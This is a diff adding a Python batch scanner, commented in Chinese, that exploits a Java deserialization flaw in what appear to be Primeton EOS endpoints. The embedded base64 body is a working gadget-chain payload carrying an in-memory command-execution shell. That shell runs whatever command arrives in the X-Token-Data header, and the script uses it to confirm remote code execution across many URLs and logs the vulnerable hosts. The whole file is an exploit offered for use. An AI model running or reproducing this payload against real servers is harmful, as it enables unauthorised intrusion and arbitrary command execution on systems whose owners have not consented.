@@ -1,0 +1,86 @@
+import base64
+import requests
+import argparse
+from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# 请求体内容，需要base64解码
+body_encoded = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3Ijt/kQAhlemwIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAJSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtTAAZX2FjY2Vzc0V4dGVybmFsU3R5bGVzaGVldHEAfgAETAALX2F1eENsYXNzZXN0ADtMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvSGFzaHRhYmxlO1sACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAETAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAAAAAAAAB0AANhbGxwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAD/PK/rq+AAAAMQDjAQAub3JnL2FwYWNoZS9jb3lvdGUvdGFnbGliL2NvcmUvQ29udmVydGVySW1wbFRhZwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlDAAFAAYKAAQACQEAAXEBADMoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAdleGVjQ21kDAANAAwKAAIADgEACDxjbGluaXQ+AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwARAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAEwEAE2phdmEvbGFuZy9FeGNlcHRpb24HABUBABVqYXZhL2xhbmcvVGhyZWFkR3JvdXAHABcBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHABkBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAGwEAE1tMamF2YS9sYW5nL1RocmVhZDsHAB0BABBqYXZhL2xhbmcvVGhyZWFkBwAfAQAQamF2YS9sYW5nL1N0cmluZwcAIQEADmphdmEvdXRpbC9MaXN0BwAjAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HACUBAA1TdGFja01hcFRhYmxlAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DAAoACkKACAAKgEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwwALAAtCgAgAC4BABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DAAwADEKACAAMgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwANAA1CgAEADYBAAd0aHJlYWRzCAA4AQAPamF2YS9sYW5nL0NsYXNzBwA6AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAPAA9CgA7AD4BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAQABBCgAcAEIBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwARABFCgAcAEYBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsMAEgASQoAIABKAQAEZXhlYwgATAEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABOAE8KACIAUAEABGh0dHAIAFIBAAZ0YXJnZXQIAFQBABJqYXZhL2xhbmcvUnVubmFibGUHAFYBAAZ0aGlzJDAIAFgBAAdoYW5kbGVyCABaAQANZ2V0U3VwZXJjbGFzcwwAXAA1CgA7AF0BAAZnbG9iYWwIAF8BAApwcm9jZXNzb3JzCABhAQAEc2l6ZQEAAygpSQwAYwBkCwAkAGUBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAEQAZwsAJABoAQADcmVxCABqAQALZ2V0UmVzcG9uc2UIAGwBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DABuAG8KADsAcAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcAcgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAdAB1CgBzAHYBAAlnZXRIZWFkZXIIAHgBAApDTURfSEVBREVSAQASTGphdmEvbGFuZy9TdHJpbmc7DAB6AHsJAAIAfAEAB2lzRW1wdHkBAAMoKVoMAH4AfwoAIgCAAQAJc2V0U3RhdHVzCACCAQARamF2YS9sYW5nL0ludGVnZXIHAIQBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMAIYAhwkAhQCIAQAEKEkpVgwABQCKCgCFAIsMAAsADAoAAgCNAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCACPAQAHZm9yTmFtZQEAPShMamF2YS9sYW5nL1N0cmluZztaTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspTGphdmEvbGFuZy9DbGFzczsMAJEAkgoAOwCTAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAlQCWCgA7AJcBAAhzZXRCeXRlcwgAmQEAAltCBwCbAQARZ2V0RGVjbGFyZWRNZXRob2QMAJ0AbwoAOwCeAQALdG9CeXRlQXJyYXkBAAQoKVtCDACgAKEKACYAogEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DACkAKUKAIUApgEAB2RvV3JpdGUIAKgBABNqYXZhLm5pby5CeXRlQnVmZmVyCACqAQAEd3JhcAgArAEA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"  # 替换为实际的base64编码请求体
+body_decoded = base64.b64decode(body_encoded)
+
+# 要测试的接口列表
+ENDPOINTS = [
+    "/workspace/frame/permission/common/eos.jmx",
+    "/workspace/frame/permission/common/eos.download",
+    "/default/jmx.jmx",
+    "/default/jmx.download"
+]
+
+# 设置超时时间（秒）
+TIMEOUT = 10
+
+
+def check_vulnerability(url, results_file):
+    parsed_url = urlparse(url)
+    headers = {
+        'Host': parsed_url.netloc,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
+        'X-Token-Data': 'echo 11112222',
+        'Content-Type': 'text/plain',
+        'Connection': 'close'
+    }
+
+    vulnerabilities_found = False
+
+    for endpoint in ENDPOINTS:
+        full_url = url.rstrip('/') + endpoint
+        try:
+            response = requests.post(full_url, headers=headers, data=body_decoded, timeout=TIMEOUT)
+            if "11112222" in response.text:
+                print(f"存在漏洞: {full_url}")
+                vulnerabilities_found = True
+            else:
+                print(f"未发现漏洞: {full_url}")
+        except requests.exceptions.Timeout:
+            print(f"请求超时: {full_url} 超过 {TIMEOUT} 秒")
+        except Exception as e:
+            print(f"请求出错: {full_url} 错误信息: {str(e)}")
+
+    if vulnerabilities_found:
+        # 获取基础URL部分（不包含接口路径）
+        base_url = url.rstrip('/')
+        with open(results_file, 'a') as f:
+            f.write(base_url + '\n')
+
+
+def main():
+    parser = argparse.ArgumentParser(description="批量验证特定漏洞是否存在")
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument('-f', type=str, help='从文件中读取URL列表，每行一个URL')
+    group.add_argument('-u', type=str, help='直接指定一个URL进行测试')
+
+    parser.add_argument('--results-file', type=str, default='results.txt', help='结果文件路径')
+
+    args = parser.parse_args()
+
+    urls = []
+
+    if args.f:
+        with open(args.f, 'r') as file:
+            urls = [line.strip() for line in file if line.strip()]
+    elif args.u:
+        urls.append(args.u)
+
+    # 使用线程池进行并发处理
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = {executor.submit(check_vulnerability, url, args.results_file): url for url in urls}
+        for future in as_completed(futures):
+            url = futures[future]
+            try:
+                future.result()
+            except Exception as e:
+                print(f"处理URL {url} 时发生错误: {str(e)}")
+
+
+if __name__ == '__main__':
+    main()
